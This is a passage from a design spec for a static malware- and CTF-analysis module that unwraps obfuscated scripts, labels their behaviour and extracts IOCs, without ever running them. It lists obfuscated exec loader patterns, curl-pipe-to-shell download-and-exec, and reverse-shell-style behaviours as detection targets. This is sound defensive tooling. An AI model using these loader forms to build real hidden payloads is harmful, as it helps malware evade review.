# `revauto` — Flagship Module Spec (automated RE analyst)

Planning artifact for issue #44. **No code in this PR.** A sonnet-run issue
implements `toolkit/modules/revauto.py` against this document verbatim. Where
this spec and `PLAN.md` disagree, `PLAN.md`'s hard constraints and quality bar
win; everything else here is binding for `revauto`.

> **Status: SPECCED (2026-11-14)** — not implemented.

Keywords: **MUST** = required for acceptance (selftest or review gate).
**SHOULD** = expected; omit only with a written reason in the PR body.
**MAY** = stretch, do it if time allows, never at the cost of a MUST.

---

## 0. Contents

1. Purpose and framing
2. Non-negotiables (safety, offline, resource caps)
3. File layout, imports, public API
4. CLI
5. Input routing (lane selection)
6. Data model + JSON schema
7. Lane 1 — script lane
8. Shared analysis: IOCs, crypto constants, tells and scoring
9. Lane 2 — binary lane
10. Report rendering
11. Selftest specification
12. Acceptance criteria (review checklist)
13. Limits and performance budgets
14. Out of scope / stretch
15. Suggested build order inside the PR
16. Docs to update in the implementation PR
- Appendix A — Ghidra post-script template
- Appendix B — Example compact reports

---

## 1. Purpose and framing

Owner's ask, verbatim: *"it can tell me what all the parts of the script are
doing"*.

`revauto` is a **junior analyst**. Given a file it:

1. figures out what it is (script language / binary format),
2. peels obfuscation layers with **pure transforms only**,
3. splits the final code into **labelled parts** (functions, blocks, top-level
   runs) and says, mechanically, what each part *does* ("opens a TCP socket to
   10.13.37.5:4444", "appends a line to ~/.bashrc", "compares input XOR 0x42
   with a constant array"),
4. lists **IOCs** and **tells** with line/address references and confidence
   labels,
5. solves the trivial stuff when it is safe and deterministic (simple XOR /
   add flag checkers, encoded string literals).

It **never** makes an intent call. Wording rules for all generated text:

- Describe behaviour, not intent: "writes to ~/.bashrc" — never "malicious",
  "malware", "backdoor", "evil". The risk score is a *tell density*, labelled as
  such.
- Every claim carries a confidence label: `[H]` deterministic (exact decode,
  exact byte signature, resolved import), `[M]` heuristic with corroboration,
  `[L]` single weak heuristic.
- When something could not be resolved statically, say so and say what the
  human should do next ("needs dynamic eval; try `node --jitless` in a VM" is
  **not** allowed — revauto never suggests running the payload; use "not
  statically resolvable; inspect manually").

---

## 2. Non-negotiables

### 2.1 Never execute the analysed payload (MUST)

- No `eval`, `exec`, `compile` (the builtin) anywhere in `revauto.py`.
  `ast.parse` is allowed (AST only, no code object is executed).
- No `pickle.load(s)` / `pickle.Unpickler` ever. Pickles are **disassembled**
  with `pickletools.genops` only.
- `marshal.loads` only inside the isolated helper child process (§7.4.4), which
  turns code objects into a JSON description via `dis` and never calls them.
- No `os.system`, no `subprocess` with `shell=True`. Allowed child processes,
  all with an argv list, `stdin` explicit, and a timeout:
  1. `sys.executable` (marshal helper only, §7.4.4),
  2. `r2` / `radare2` (§9.3),
  3. `analyzeHeadless` (§9.4),
  4. version probes `r2 -v` (timeout 5 s).
  Never `node`, `bash`, `sh`, `python <payload>`, `perl`, `upx`, decompilers.
  Those may only be **suggested** in the NEXT STEPS section when on PATH.
- The selftest proves non-execution with a canary (§11, S3) and a source lint
  (§11, S1).

### 2.2 Offline (MUST)

No `socket` / `urllib.request` / `http.client` / `ftplib` / `smtplib` /
`requests` imports. URLs found in payloads are reported, never fetched.
`curl … | sh` style download-and-exec is reported as a tell; nothing is
downloaded.

### 2.3 Resource caps (MUST) — all module-level constants

| constant | value | meaning |
|---|---|---|
| `MAX_INPUT` | 64 MiB | bytes read from the input file (rest ignored, note emitted) |
| `MAX_SCRIPT` | 8 MiB | script-lane text size; larger text is analysed on the first 8 MiB with a note |
| `MAX_LAYER_OUT` | 16 MiB | max bytes produced by any single transform (decompress bombs truncate here) |
| `MAX_TOTAL_OUT` | 64 MiB | sum of all layer bytes per run |
| `DEFAULT_DEPTH` / `HARD_DEPTH` | 8 / 32 | layer depth (CLI `--max-depth`, clamped to hard cap) |
| `MAX_LAYERS` | 24 | total layers (tree nodes) per run |
| `FOLD_BUDGET` | 200 000 | AST/token nodes visited per fold attempt |
| `MAX_ITER` | 1 000 000 | comprehension / loop iterations in the folder |
| `MAX_STR_MULT` | 1 MiB | max result of `str * int` in the folder |
| `HELPER_TIMEOUT` | 10 s | marshal helper wall time |
| `R2_TIMEOUT` | 120 s | default r2 wall time (`--timeout`) |
| `GHIDRA_TIMEOUT` | 600 s | default analyzeHeadless wall time (`--timeout`) |
| `MAX_FINDINGS` | 5 000 | per list (strings, IOCs, tells …); further items dropped with a note |

Decompression is always bounded: `zlib.decompressobj(wbits).decompress(data,
MAX_LAYER_OUT)` (wbits 15 / 31 gzip / -15 raw / 47 auto), `bz2.BZ2Decompressor`
/ `lzma.LZMADecompressor().decompress(data, max_length=...)`. Hitting a cap
produces a `note` ("output truncated at 16 MiB cap") and a `T-SIZE-CAP` tell,
never an exception.

### 2.4 Robustness (MUST)

Every analyser stage runs inside `_stage(report, name, fn, *a)` which catches
`Exception` (not `BaseException`), appends `"<stage>: <ExcType>: <msg>"` to
`report.errors`, and continues. A broken detector degrades the report; it never
kills the run. `RecursionError` and `MemoryError` are included. The CLI prints
`report.errors` under an `ERRORS` section (compact: count + first 3).

---

## 3. File layout, imports, public API

### 3.1 Single file

`toolkit/modules/revauto.py`, one file, expected 2 200–3 000 lines. Sections in
this order with `# ---------- <title>` banners: constants → data model →
shared helpers (IOC, crypto table, scoring) → language detection → transforms →
Python unwrapper → marshal helper → pickle → JS tokenizer/folder/unpackers →
shell unwrapper → layer engine → annotators (py/js/sh/generic) → checker solver
→ binary builtin → r2 backend → ghidra backend → binary merge → rendering → CLI
→ selftest fixtures → selftest → `__main__`.

If the file passes ~3 000 lines the implementer MAY move the pure data tables
(capability rules, crypto constants, API maps) into
`modules/revauto_rules.py`. That file MUST NOT define `NAME`/`run`/`selftest`
(so `discover()` imports but does not register it) and MUST import cleanly
standalone.

### 3.2 Sibling imports (reuse, do not duplicate)

Use the same dual-mode pattern as `shellcode.py`:

```python
if __package__:
    from . import batch, binextras, decode, disasm, pwnhelp, triage
else:  # python3 modules/revauto.py
    import batch, binextras, decode, disasm, pwnhelp, triage  # type: ignore[no-redef]
```

What is reused (do not re-implement these):

| need | reuse |
|---|---|
| file type, hashes, entropy, entropy note | `triage.detect_type`, `triage.hashes`, `triage.entropy`, `triage.entropy_note` |
| ASCII + UTF-16LE strings | `triage.extract_strings` (offsets: see §9.2.6) |
| ELF headers, protections | `triage.parse_elf`, `triage.elf_protections` |
| PE headers + sections | `triage.parse_pe` |
| section map, vaddr↔offset, capstone disasm, hex fallback | `disasm.parse_elf`, `disasm.vaddr_to_offset`, `disasm.offset_to_vaddr`, `disasm.get_section`, `disasm.disassemble`, `disasm.hexdump`, `disasm.capstone`, `disasm.NO_CAPSTONE_MSG` |
| string xrefs (RIP-relative LEA) | `disasm.find_xrefs` |
| x86-64 syscall names | `disasm.SYSCALLS` |
| base test ELF | `disasm.build_test_elf` |
| executable regions, embedded-file signatures | `binextras.executable_regions`, `binextras.scan_signatures` |
| import → GOT slot | `pwnhelp.got_plt` |
| base64/hex decode + printable scoring | `decode.b64_decode`, `decode.b32_decode`, `decode.hex_decode`, `decode.printable_ratio`, `decode.plaintext_like`, `decode.english_score` |
| flag regex | `FLAG_RE_B = batch.FLAG_RE`; text variant `FLAG_RE = re.compile(batch.FLAG_RE.pattern.decode())` |

New code `revauto` owns: everything else in this spec. Specifically it adds its
own `elf_symbols()` (§9.2.3) because no sibling exposes `st_info`/`st_size`/
`st_shndx`, and its own all-target call scanner (§9.2.4) because
`disasm.find_xrefs` keeps only in-`.text` targets.

### 3.3 Public API (names are binding; tests and future `batch` integration use them)

```python
NAME = "revauto"
DESCRIPTION = "Automated RE analyst: unwrap obfuscated py/js/sh, label each part, IOCs + tells; ELF/PE digest (r2/ghidra/builtin)"

@dataclass
class Options:
    deep: bool = False
    as_json: bool = False
    max_depth: int = DEFAULT_DEPTH
    lane: str = "auto"          # auto|script|bin
    lang: str = "auto"          # auto|py|pyc|js|sh|ps1
    engine: str = "auto"        # auto|r2|ghidra|none
    timeout: int | None = None  # engine timeout override (seconds)
    flag_re: re.Pattern | None = None   # from --flag-format; None -> FLAG_RE
    rename: bool = False
    dump_dir: str | None = None

def analyze(data: bytes, name: str = "<input>", opts: Options | None = None,
            engines: "Engines | None" = None) -> "Report": ...
def detect_input(data: bytes, name: str = "") -> tuple[str, str, str]:   # (lane, lang, confidence)
def unwrap_layers(data: bytes, lang: str, opts: Options, report: "Report") -> list["Layer"]: ...
def annotate_layer(layer: "Layer", opts: Options, report: "Report") -> None: ...
def extract_iocs(text: str, loc_prefix: str, flag_re: re.Pattern) -> list["IOC"]: ...
def scan_crypto_constants(data: bytes, base_vaddr: int | None = None) -> list[dict]: ...
def detect_engines(which: Callable[[str], str | None] = shutil.which) -> "Engines": ...
def analyze_binary(data: bytes, path: str | None, opts: Options, report: "Report",
                   engines: "Engines") -> None: ...
def render_text(report: "Report", deep: bool = False) -> str: ...
def report_to_dict(report: "Report") -> dict: ...
def run(args: list[str]) -> int: ...
def selftest() -> bool: ...
```

`analyze()` never raises for any `bytes` input (S13 fuzz check). `engines=None`
means `detect_engines()` with the real `shutil.which`; selftest injects fakes.

Module-level hook `_WHICH = shutil.which` is what the CLI path uses, so the
selftest can swap it to simulate "r2 absent" through `run()`.

---

## 4. CLI

Flag-style with three reserved verbs. Exact usage text (printed for bare / `-h`
/ `--help`, exit 0):

```
revauto usage:
  recon.py revauto <file|-> [options]     analyze a script or binary ('-' = stdin)
  recon.py revauto engines                show detected analysis engines / helpers
  recon.py revauto selftest               run self-tests (--selftest also accepted)

options:
  --json               machine-readable report (schema revauto/1)
  --deep               full dumps: every layer, cleaned source, all strings, disasm
  --lane LANE          force lane: script | bin            (default: auto)
  --lang LANG          force script language: py | pyc | js | sh | ps1
  --max-depth N        max unwrap depth (default 8, hard cap 32; 0 = no unwrapping)
  --engine E           binary engine: auto | r2 | ghidra | none   (default: auto)
  --timeout SECS       engine timeout (default r2 120, ghidra 600)
  --flag-format REGEX  extra flag regex, e.g. 'CyberSci\{[^}]+\}'
  --rename             in the cleaned view, rename obfuscated identifiers (var_1, func_1...)
  --dump-layers DIR    write every unwrapped layer to DIR (new files only)

examples:
  recon.py revauto chall.py
  recon.py revauto dropper.js --deep
  recon.py revauto ./crackme --engine none --json
```

Parsing: `argparse` with `add_help=False` and a manual `-h/--help` check, like
the other modules; `SystemExit` from argparse is converted (usage error → 2).
Unknown option, missing file argument with other options, bad `--lane` /
`--lang` / `--engine` value, `--max-depth` < 0, invalid `--flag-format` regex
→ print usage to stderr, return **2**.

`--flag-format` is compiled with `re.compile`; it is used **in addition to**
`FLAG_RE`, never replacing it.

Exit codes:

| code | when |
|---|---|
| 0 | report produced (findings or not), including when an *auto* engine choice found no engine |
| 1 | file missing/unreadable, empty input, `--lane bin` on a non-ELF/PE, explicitly requested engine (`--engine r2` / `ghidra`) unavailable or failed (**report is still printed**, builtin results included, plus `warning:` on stderr), `--dump-layers` target unwritable or file exists |
| 2 | usage error |

The `engines` verb always returns 0.

`engines` verb output (exit 0), one line each, `present`/`absent` + path +
version where cheap:
`r2`/`radare2`, `r2pipe` (importable), `analyzeHeadless` (PATH, then
`$GHIDRA_INSTALL_DIR/support/analyzeHeadless`, then
`/usr/share/ghidra/support/analyzeHeadless`), `capstone`, and *suggest-only*
helpers `upx`, `pycdc`, `decompyle3`, `uncompyle6`, `js-beautify` (shown with
the note "suggested in NEXT STEPS only; revauto never runs it").

Menu friendliness: works unchanged through `recon.py`'s `name args>` prompt;
no interactive prompts inside the module, no ANSI colour, every output line
≤ 100 columns in compact mode (truncate with `…`).

`--dump-layers DIR`: `os.makedirs(DIR, exist_ok=True)`; files
`<id>.<ext>` (e.g. `L3.py`) (`ext` by lang: py, js, sh, ps1, pyc.txt for helper dumps, bin
otherwise), plus `<id>.clean.py` / `<id>.pretty.js` when a cleaned/pretty
view exists. Opened with mode `"xb"`; an existing file → `error:` + exit 1
(after printing the report). Dumped data is decoded payload — never executed.

`-` reads `sys.stdin.buffer` (capped at `MAX_INPUT`); name shown as `<stdin>`.

---

## 5. Input routing (lane selection)

`detect_input(data, name)` → `(lane, lang, confidence)`:

1. `\x7fELF` → `("bin", "elf", "high")`.
2. `MZ` and `triage.parse_pe` succeeds → `("bin", "pe", "high")`; plain `MZ`
   without PE header → `("blob", "data", "medium")`.
3. `.pyc` magic: bytes 2–3 == `b"\r\n"` and `int.from_bytes(data[:2], "little")`
   in 3000..4000 → `("script", "pyc", "high")`.
4. Container / encoding magics (whole file): gzip `1f 8b`, zlib (`78 01|5e|9c|da`
   and header checksum `(b0*256+b1) % 31 == 0`), bz2 `BZh`, xz `fd 37 7a 58 5a 00`,
   pickle (`80 0x02..0x05` protocol header, or protocol-0 text ending in `.` with
   opcodes `c`/`(`/`R`) → `("script", "blob", "high")`; the layer engine
   decodes it as layer L0 → L1.
5. Text test: strip UTF-8 BOM; UTF-16LE/BE BOM → decode as UTF-16 (PowerShell
   files are often UTF-16LE). Text if ≥ 95 % of the first 64 KiB decodes as
   UTF-8 and printable ratio (`decode.printable_ratio`) ≥ 0.85. Text →
   `("script", <lang>, conf)` via §7.1. Non-text, non-magic → `("blob",
   "data", "low")`.

`--lane` / `--lang` override detection (`confidence = "forced"`). `--lane bin`
on non-ELF/PE → exit 1 with `error: not an ELF/PE file`.

**Blob lane** (`lane == "blob"`): mini report = entropy, `triage.extract_strings`
+ IOC scan over strings, `scan_crypto_constants`, `binextras.scan_signatures`
(embedded files at offset > 0), plus a whole-blob transform attempt (§7.7). If a
transform yields text, processing continues in the script lane with that text
as L1 and the report's lane becomes `script`.

Scripts discovered *inside* binaries are out of scope (strings only); binaries
discovered inside scripts are handled in §7.2 (embedded payload layers).

---

## 6. Data model + JSON schema

### 6.1 Dataclasses (all `@dataclass`, all fields typed)

```python
@dataclass
class Layer:
    id: str                 # "L0", "L1", ... in creation order
    parent: str | None
    depth: int
    lang: str               # py|pyc|js|sh|ps1|html|blob|elf|pe|data|text
    kind: str               # transform chain that produced it, e.g. "b64 -> zlib"; "input" for L0
    via: str                # sink in the parent: exec|eval|compile|Function|eval-packer|pipe-sh|
                            # bash-c|document.write|embedded|whole-file|marshal|pickle|-
    src_loc: str | None     # where in the parent the payload literal sits, e.g. "L1:3"
    data: bytes
    text: str | None        # decoded text if lang is textual
    view: str | None        # cleaned/pretty text used for annotation line refs (see §7.9.4)
    sha256: str
    confidence: str         # high|medium|low
    notes: list[str]
    meta: dict              # lang-specific (e.g. marshal helper JSON, pickle ops)

@dataclass
class Evidence:
    loc: str                # "L2:14" | "L2:1:c2345" | "0x401136" | "off:0x1a0"
    snippet: str            # <= 120 chars, single line
    rule: str               # rule id from the tables

@dataclass
class Block:
    layer: str
    kind: str               # imports|function|method|class|top-level|main-guard|iife|
                            # shell-function|loop|conditional|code-object|binary-function
    name: str               # identifier or "" ; binary: symbol / sub_<addr>
    start: int              # line (scripts) or address (binary)
    end: int
    categories: list[str]   # sorted subset of CATEGORIES
    actions: list[str]      # ordered, de-duplicated action phrases (§7.9.3)
    calls: list[str]        # intra-file callees (scripts) / internal funcs (binary)
    evidence: list[Evidence]
    summary: str            # one line, built by §7.9.3
    confidence: str

@dataclass
class Tell:
    id: str                 # T-... from §8.3
    severity: str           # info|low|medium|high
    loc: str
    title: str
    detail: str
    confidence: str

@dataclass
class IOC:
    type: str               # url|ip|ip_port|domain|email|path|winpath|registry|flag|
                            # key_pem|aws_key|jwt|tg_token|hex_secret|secret_assign|b64_blob
    value: str
    loc: str
    context: str
    confidence: str
    tags: list[str]         # e.g. private, loopback, decoded, reversed, from-binary

@dataclass
class Checker:
    loc: str
    method: str             # e.g. "xor 0x42", "xor key 'abc'", "sub i", "reverse", "b64"
    candidate: str
    confidence: str
    detail: str

@dataclass
class EngineStatus:
    name: str               # r2|ghidra|builtin
    status: str             # ok|skipped|error|not-requested
    backend: str            # r2pipe|subprocess|analyzeHeadless|stdlib|""
    path: str
    reason: str
    seconds: float

@dataclass
class Report:
    target: dict            # name,size,sha256,md5,type
    lane: str
    lang: str
    lang_confidence: str
    layers: list[Layer]
    blocks: list[Block]
    tells: list[Tell]
    iocs: list[IOC]
    checkers: list[Checker]
    binary: dict | None     # §9.5
    engines: dict[str, EngineStatus]
    scores: dict            # {"risk": {...}, "obfuscation": {...}}
    notes: list[str]
    errors: list[str]
```

`CATEGORIES` (fixed, ordered for display):
`DYNAMIC_CODE, EXEC, NETWORK, DOWNLOAD, FILE_READ, FILE_WRITE, FILE_DELETE,
PERSISTENCE, CREDENTIALS, RECON, PRIVESC, ANTI_ANALYSIS, DESTRUCTIVE, CRYPTO,
ENCODING, INPUT, COMPARE_CHECK, DYNAMIC_LOAD, MEMORY_EXEC, RNG, OUTPUT`.

### 6.2 JSON (`--json`, `report_to_dict`)

Top-level keys are **always present** (empty list / null when unused):

```json
{
  "schema": "revauto/1",
  "target": {"name": "...", "size": 0, "sha256": "...", "md5": "...", "type": "..."},
  "lane": "script|binary|blob",
  "lang": "...", "lang_confidence": "...",
  "summary": {
    "headline": "one line, same as text SUMMARY first line",
    "behaviours": ["NETWORK", "PERSISTENCE"],
    "risk": {"score": 0, "band": "low|medium|high"},
    "obfuscation": {"score": 0, "band": "none|light|heavy", "layers": 0},
    "flags": ["flag{...}"]
  },
  "layers": [{"id": "L0", "parent": null, "depth": 0, "lang": "py", "kind": "input", "via": "-",
              "src_loc": null, "size": 0, "sha256": "...", "confidence": "high",
              "notes": [], "preview": "first 3 lines",
              "text": "full text if leaf or --deep, else null; capped 64 KiB unless --deep"}],
  "blocks": [...], "tells": [...], "iocs": [...], "checkers": [...],
  "binary": null,
  "engines": {"r2": {...EngineStatus}, "ghidra": {...}, "builtin": {...}, "capstone": true},
  "notes": [], "errors": []
}
```

`bytes` values are never emitted raw; `Layer.data` is not serialised (only size,
sha256, and `text`). `json.dumps(..., indent=2, ensure_ascii=False, default=str)`.

---

## 7. Lane 1 — script lane

### 7.1 Language detection (`_detect_lang(text) -> (lang, confidence)`)

Score each of `py`, `js`, `sh`, `ps1`; highest wins; ties → `py > js > sh > ps1`.
Confidence: `high` if winner ≥ 6 and margin ≥ 3, `medium` if winner ≥ 3, else
`low` (still use winner; `text` if all are 0).

| signal | lang | points |
|---|---|---|
| shebang containing `python` / `node` / `sh\|bash\|zsh\|dash` / `pwsh\|powershell` | that lang | +10 |
| `ast.parse(text)` succeeds and text has ≥ 1 newline or `import`/`exec(`/`def ` | py | +6 |
| `^\s*(import \w\|from [\w.]+ import )` (per line, max 3) | py | +2 each |
| `^\s*def \w+\(.*\):`, `^\s*class \w+.*:`, `__name__`, `print(` | py | +2 each (max 1 per kind) |
| `\b(var\|let\|const)\s+\w+\s*=`, `function\s*\w*\s*\(`, `=>`, `document\.`, `window\.`, `require\(`, `console\.log`, `===` | js | +2 each kind |
| `eval(function(p,a,c,k,e,` | js | +10 |
| `^\s*(if \[\|fi$\|then$\|do$\|done$\|esac$)`, `\$\(`, `\$\{\w+`, `\|\s*(ba)?sh\b`, `^\s*(echo\|export\|chmod\|curl\|wget)\s` | sh | +2 each kind |
| `\$\w+\s*=`, `Invoke-Expression\|IEX\b`, `-EncodedCommand\|-enc\b`, `\[System\.Convert\]::`, `New-Object\s` | ps1 | +3 each kind |

### 7.2 Layer engine (`unwrap_layers`)

Layers form a **tree**; traversal is breadth-first:

```
L0 = Layer(input)
queue = [L0]; seen = {sha256(L0.data)}
while queue and len(layers) < MAX_LAYERS:
    cur = queue.pop(0)
    if cur.depth >= opts.max_depth: note "depth cap reached at <id>" + T-DEPTH-CAP; continue
    for cand in DETECTORS[cur.lang](cur):            # list[Unwrap]
        if total_out + len(cand.data) > MAX_TOTAL_OUT: note; break
        h = sha256(cand.data)
        if h in seen: note "<id>: payload identical to an earlier layer (cycle)"; continue
        child = Layer(id=f"L{n}", parent=cur.id, depth=cur.depth+1, lang=cand.lang or detect, ...)
        layers.append(child); queue.append(child); seen.add(h)
```

`Unwrap = (data: bytes, lang: str | None, kind: str, via: str, src_loc: str,
confidence: str, notes: list[str])`.

Rules:

- **Which payloads become layers.** (a) any argument of a code sink (exec /
  eval / compile / Function / packer / `| sh` / `bash -c` / `IEX` / marshal /
  pickle) that folds to a value — even a plain literal string; (b) a
  *decoded* literal (≥ 1 transform applied) of ≥ 64 bytes that is not passed to
  a sink but looks like code (`_detect_lang` ≥ medium), an ELF/PE/archive
  magic, or ≥ 80 % printable text — `via="embedded"`. Plain literals that were
  never transformed and never reach a sink are *not* layers (they are scanned
  for IOCs in place).
- **Leaves** (layers with no children) are the "final layers" and are always
  annotated. Intermediate layers are annotated only with `--deep` (tells and
  IOCs are collected on **every** layer always — the wrappers carry tells).
- An embedded ELF/PE layer is not recursed into; with `--deep` a builtin-only
  binary digest (§9.2, engines forced `none`) is attached as `layer.meta["binary"]`.
- The `kind` string joins applied transforms with ` -> ` in application order,
  e.g. `reverse -> b64 -> zlib`.
- `--max-depth 0` → only L0, no detectors run (tells/annotation still run).
- Layer `lang` for a child: from the sink (`exec`→py, `Function`/`eval` in JS→js,
  `|sh`→sh, `python -c`→py, `node -e`→js, `IEX`/`-enc`→ps1, `document.write`→html,
  marshal→pyc, pickle→blob) else `_detect_lang`/magic.

`DETECTORS` map: `py` → §7.4, `pyc` → §7.4.4, `js` → §7.5, `html` → §7.5.6,
`sh` → §7.6, `ps1` → §7.6.6, `blob` / `data` / `text` → §7.7 (also run as a
last resort on every textual layer whose whole content is one token).

### 7.3 Pure transforms (`TRANSFORMS`)

One table, shared by the Python folder, JS folder, shell pipeline and blob
decoder. Each entry `name -> fn(bytes|str, *args) -> bytes|str`; every function
is pure, bounded by `MAX_LAYER_OUT`, and raises `TransformError` on bad input.

`b64` (std + urlsafe, padding-tolerant, via `decode.b64_decode`), `b32`, `b16`/`hex`
(`decode.hex_decode`, tolerant of `\x`/`0x`/spaces/colons), `b85`, `a85`,
`zlib`, `gzip`, `raw-deflate`, `bz2`, `lzma`/`xz`, `rot13`, `reverse`,
`utf8` / `latin1` / `utf16le` decode, `url` (`urllib.parse.unquote_to_bytes`),
`js-unescape` (`%uXXXX` + `%XX`), `charcodes` (int list → str), `xor`
(single-byte or repeating key, used by folders only when key is literal),
`tr` (literal set translation), `fromhex`.

### 7.4 Python unwrapper

#### 7.4.1 Static folder (`PyFolder`)

`fold(node, env) -> Value | UNKNOWN`, where `Value` is `str | bytes | int |
bool | None | tuple/list of Value | MarshalBlob | PickleBlob | ModuleRef |
FuncRef | LambdaVal`. Visits ≤ `FOLD_BUDGET` nodes, recursion depth ≤ 200, else
`UNKNOWN` + note.

Supported nodes:

- `Constant`, `JoinedStr` only when all parts fold, `List`/`Tuple` of foldables.
- `BinOp`: `+` (str/bytes/int/list), `*` (str/bytes/list × int, result ≤
  `MAX_STR_MULT`), `-`, `^`, `%`, `&`, `|`, `<<`, `>>`, `//` on ints.
- `UnaryOp` `-`, `~`, `not`.
- `Subscript` with constant index / slice (incl. `[::-1]`).
- `Name` → `env` lookup (§7.4.2), builtins whitelist (`chr, ord, bytes,
  bytearray, str, int, list, map, reversed, len, range, zip, sum, hex`,
  `__import__`), imported modules → `ModuleRef`.
- `Attribute` → module attribute (`ModuleRef('base64').b64decode` → `FuncRef`)
  or a bound string/bytes method.
- `Call`:
  - whitelist `FuncRef`s: `base64.{b64decode,b32decode,b16decode,b85decode,
    a85decode,urlsafe_b64decode,standard_b64decode,decodebytes,b64encode,
    encodebytes}`, `binascii.{unhexlify,a2b_hex,a2b_base64,hexlify}`,
    `bytes.fromhex`, `codecs.decode/encode` (codec names: `rot13, rot_13,
    hex, hex_codec, base64, base64_codec, zlib, zlib_codec, bz2, utf-8, utf8,
    latin-1, utf-16`), `zlib.decompress`, `gzip.decompress`,
    `bz2.decompress`, `lzma.decompress`, `marshal.loads` (→ `MarshalBlob`, not
    decoded in-process), `pickle.loads` (→ `PickleBlob`), `str`/`bytes`
    methods `decode, encode, join, replace, strip, lstrip, rstrip, lower,
    upper, split, translate` (with `str.maketrans`/`bytes.maketrans` of
    literals), `chr, ord, int(x, base), bytes(list), bytearray(list),
    list(map(chr, ...)), ''.join(...)`;
  - module resolution through `__import__('m')`, `importlib.import_module('m')`,
    `getattr(<module>, '<attr>')`, `getattr(__builtins__, 'exec')`,
    `vars(__builtins__)['exec']`, `sys.modules['m']` — all with **folded**
    string arguments (that is how `getattr(__import__('ba'+'se64'), 'b64'+'decode')`
    resolves);
  - `LambdaVal` application: `(lambda x: body)(arg)` and `name(arg)` where
    `name` was bound to a lambda — fold `body` with `x := folded arg`
    (positional args only, ≤ 4 params, ≤ 16 nested applications).
- `ListComp` / `GeneratorExp` with exactly one `for` (optional literal-only
  `if`), iterating a folded iterable, element folded with the loop target
  bound; ≤ `MAX_ITER` iterations. Covers `''.join(chr(c ^ 5) for c in [...])`,
  `''.join([chr(x) for x in L])`, `bytes(c ^ k for c in data)`.

Anything else → `UNKNOWN`. The folder never calls anything outside this
whitelist; whitelist functions are dispatched through an explicit dict, never
via `getattr(module, user_string)`.

#### 7.4.2 Environment

Single pass over **top-level** statements in order. `X = <expr>` (single Name
target) and tuple unpacking of equal-length foldable tuples bind names;
`X += <expr>` updates; `import m [as a]` / `from m import f [as g]` bind
`ModuleRef`/`FuncRef` (`from m import *` for whitelisted modules binds all
whitelisted names). Any assignment to the same name inside a function, loop,
`with`, `try` or conditional marks it **unstable** → later lookups `UNKNOWN`.
Function bodies get a child env seeded with the top-level env when folding sink
calls inside them.

#### 7.4.3 Sinks and detectors (Python)

Walk all `Call` nodes. Sinks (callee resolved via the folder):

| sink | via | child lang |
|---|---|---|
| `exec`, `eval`, `builtins.exec/eval`, resolved `getattr(..., 'exec')` | exec / eval | py (bytes decoded utf-8) |
| `compile(x, ...)` (also nested `exec(compile(...))` — report once) | compile | py |
| `exec(marshal.loads(...))`, `types.FunctionType(marshal.loads(...), ...)` | marshal | pyc |
| `pickle.loads(...)` / `pickle.load(io.BytesIO(...))` | pickle | blob (§7.4.5) |
| `os.system`, `os.popen`, `subprocess.{run,call,check_output,Popen,getoutput}` (string arg, or list arg starting with `sh/bash -c`) | shell | sh — **only if** the arg was transformed or is ≥ 200 chars; otherwise annotate in place |

The detectors also emit, for each layer, the obfuscation tells in §8.3
(`T-DECODE-EXEC`, `T-LAMBDA-WRAPPER`, `T-CONCAT-SPLIT`, …).

Recognised families that MUST unwrap (each has a selftest fixture or a
sub-check in S2):

1. `exec(base64.b64decode('...'))`, with or without `.decode()`.
2. `exec(zlib.decompress(base64.b64decode(b'...')))` and the
   `__import__('zlib').decompress(__import__('base64').b64decode(...))` form.
3. The lambda/reversed form:
   `_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'...'))`.
4. `exec(bytes.fromhex('...').decode())` and `exec(''.join(chr(c) for c in [..]))`.
5. `exec(marshal.loads(base64.b64decode(...)))`.
6. `exec(codecs.decode('...', 'rot13'))`.
7. String-split variants of all of the above (`'ba'+'se64'` module names,
   `getattr` attribute strings, `X = 'abc'; X += 'def'` accumulation).

#### 7.4.4 Marshal / `.pyc` helper (isolated child)

`MarshalBlob` layers and `.pyc` inputs are described by a helper script stored
as a **string constant** `_MARSHAL_HELPER` and run as:

```python
subprocess.run([sys.executable, "-I", "-S", "-E", "-c", _MARSHAL_HELPER],
               input=blob, capture_output=True, timeout=HELPER_TIMEOUT,
               preexec_fn=_limit_child if os.name == "posix" else None)
```

`_limit_child` sets `resource.setrlimit(RLIMIT_AS, (1 GiB, 1 GiB))` and
`RLIMIT_CPU` 10 s (guarded `try/except (ImportError, ValueError, OSError)`).

Helper behaviour (≈ 60 lines, imports only `sys, marshal, dis, json, types,
base64, io`): read stdin; if it starts with a pyc header strip 16 bytes
(3.7+ layout); `obj = marshal.loads(blob)`; if `obj` is a code object, walk it
recursively (≤ 2 000 code objects, ≤ 400 dis lines each) emitting
`{"name","qualname","filename","firstlineno","argcount","names","varnames",
"consts_str","consts_bytes_b64","consts_int","dis","children":[...]}`, using
`dis.Bytecode(co).dis()`; else emit `{"object_type": type name, "repr":
repr(obj)[:4096]}`. Output is one JSON document on stdout, ≤ 4 MiB. The
helper never calls, `exec`s, or `eval`s the code object — it only reads
attributes.

Parent side:

- Non-zero exit / timeout / bad JSON → `layer.notes += ["marshal helper failed:
  <reason>"]`, fall back to a raw string scan of the blob (`triage.extract_strings`,
  min 4) so IOCs/tells still work, confidence `low`.
- `.pyc` version: magic number → version table (`3379`→3.6, `3390–3394`→3.7,
  `3400–3413`→3.8, `3420–3425`→3.9, `3430–3439`→3.10, `3450–3495`→3.11,
  `3500–3531`→3.12, `3550–3571`→3.13, `≥3600`→3.14+). If it differs from the
  running interpreter's `importlib.util.MAGIC_NUMBER`, **skip the helper**
  (marshal formats are version-specific) and do the raw string scan; note
  "pyc for Python X.Y; running 3.Z — bytecode not disassembled. Suggested:
  `pycdc` / `decompyle3` (if installed)".
- Annotation of a pyc layer: each code object becomes a `Block` of kind
  `code-object` (`name`, `firstlineno`); capability rules (§7.9.2) are matched
  against `names` + `consts_str` (`co_names` contains `socket` and `connect` →
  NETWORK "connects (socket.connect)"; a const string matching a persistence
  path → PERSISTENCE). Constant strings feed the IOC extractor and the Python
  folder's "embedded literal" logic (a `consts_str` element that is base64 of
  code → child layer, `via="embedded"`). With `--deep`, the `dis` text is
  shown under the block.
- Exec'd string constants (`LOAD_NAME exec` followed by a `LOAD_CONST` str in
  `dis`) → child py layer, `via="exec"`, confidence medium.

#### 7.4.5 Pickle (static only)

`pickletools.genops(data)` (wrapped; stop at `MAX_FINDINGS` ops or on
`ValueError`). Track `GLOBAL` (`module name`) and `STACK_GLOBAL` (preceded by
two string pushes) → callable names; `REDUCE` / `INST` / `OBJ` / `NEWOBJ`
